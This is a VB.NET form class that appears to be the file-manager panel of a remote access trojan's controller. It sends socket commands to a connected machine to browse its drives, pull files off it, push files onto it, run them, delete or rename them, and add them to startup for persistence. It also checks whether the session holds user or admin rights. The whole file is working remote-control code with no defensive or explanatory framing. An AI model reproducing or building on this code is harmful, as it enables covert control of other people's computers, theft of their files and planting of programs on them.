Public Class FileManager
    Public sock As Integer
    Public yy As String = "|SPX|"
    Public Rights As String = ""
    Private Sub FileManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Form1.S.Send(sock, "GetDrives" & yy)
        RefreshList()
    End Sub

    Public Sub RefreshList()
        ToolStripStatusLabel1.Text = "Status: Refreshing..."
        Form1.S.Send(sock, "FileManager" & yy & TextBox1.Text)
    End Sub

    Private Sub ListView1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListView1.MouseDoubleClick
        Try
            If ListView1.FocusedItem.Index = 0 Then
                If TextBox1.Text.Length < 4 Then
                Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()
                End If
            Else
                If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
                    If TextBox1.Text.Length = 0 Then
                        TextBox1.Text += ListView1.FocusedItem.Text
                    Else
                        TextBox1.Text += ListView1.FocusedItem.Text & "\"
                    End If
                    RefreshList()
                Else
                    If TextBox1.Text.Length = 0 Then
                        TextBox1.Text += ListView1.FocusedItem.Text
                    Else
                        TextBox1.Text += ListView1.FocusedItem.Text & "\"
                    End If
                    RefreshList()
                End If
            End If

        Catch ex As Exception
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        RefreshList()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        If TextBox1.Text <> ComboBox1.SelectedItem.ToString() Then
            ListView1.Items.Clear()
            TextBox1.Text = ComboBox1.SelectedItem.ToString()
            RefreshList()
        End If

    End Sub
    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        Dim Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function
    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        DotNetBarTabcontrol1.SelectedIndex = 1
        ToolStripStatusLabel1.Text = "Status: Downloading file..."

        Dim newItem As New ListViewItem
        ListView2.SmallImageList = ImageList2

        Dim IDD As String = GetRandom(0, 100000).ToString
        newItem.Text = IDD

        newItem.SubItems.Add("Download")
        newItem.SubItems.Add("Pending ...")
        newItem.SubItems.Add(ListView1.FocusedItem.Text)
        newItem.SubItems.Add(DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"))


        ListView2.Items.Insert(0, newItem)
        ListView2.Items(0).ImageIndex = 0


        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "downloadfile" & yy & TextBox1.Text & ListView1.FocusedItem.Text & yy & ListView1.FocusedItem.Text)
        Next

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        System.Diagnostics.Process.Start(Form1.folder)
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(sock, "GetDrives" & yy)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            DotNetBarTabcontrol1.SelectedIndex = 1

            Dim newItem As New ListViewItem
            ListView2.SmallImageList = ImageList2

            Dim IDD As String = GetRandom(0, 100000).ToString
            newItem.Text = IDD

            newItem.SubItems.Add("Upload")
            newItem.SubItems.Add("Pending ...")
            newItem.SubItems.Add(o.FileName)
            newItem.SubItems.Add(DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"))


            ListView2.Items.Insert(0, newItem)
            ListView2.Items(0).ImageIndex = 3 ' Uploading

            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "sendfileto" & yy & TextBox1.Text & n.Name & yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub BrushToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BrushToolStripMenuItem.Click
        ListView2.Items.Clear()

    End Sub

    Private Sub CancelToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CancelToolStripMenuItem.Click
        For Each item As ListViewItem In ListView2.SelectedItems
            item.Remove()
        Next
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0
                Form1.S.Send(sock, "Delete" & yy & "Folder" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.S.Send(sock, "Delete" & yy & "File" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteToolStripMenuItem.Click
        Form1.S.Send(sock, "Execute" & yy & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0
                    Form1.S.Send(sock, "Rename" & yy & "Folder" & yy & TextBox1.Text & ListView1.FocusedItem.Text & yy & a)
                Case Else
                    Form1.S.Send(sock, "Rename" & yy & "File" & yy & TextBox1.Text & ListView1.FocusedItem.Text & yy & a)
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()

    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Form1.S.Send(sock, "addstartup" & yy & TextBox1.Text & yy & ListView1.FocusedItem.Text)
    End Sub

    Private Sub DesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DesktopToolStripMenuItem.Click
        Form1.S.Send(sock, "getdesktoppath")
    End Sub

    Private Sub DocumentsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DocumentsToolStripMenuItem.Click
        Form1.S.Send(sock, "getmydocumentspath")
    End Sub

    Private Sub TempToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TempToolStripMenuItem.Click

        Form1.S.Send(sock, "gettemppath")

    End Sub

    Private Sub StartupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartupToolStripMenuItem.Click
        If Rights = "User" Then
            MessageBox.Show("Can't access to startup path without Admin permissions.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
        ElseIf Rights = "Admin" Then
            Form1.S.Send(sock, "getstartuppath")
        End If

    End Sub
End Class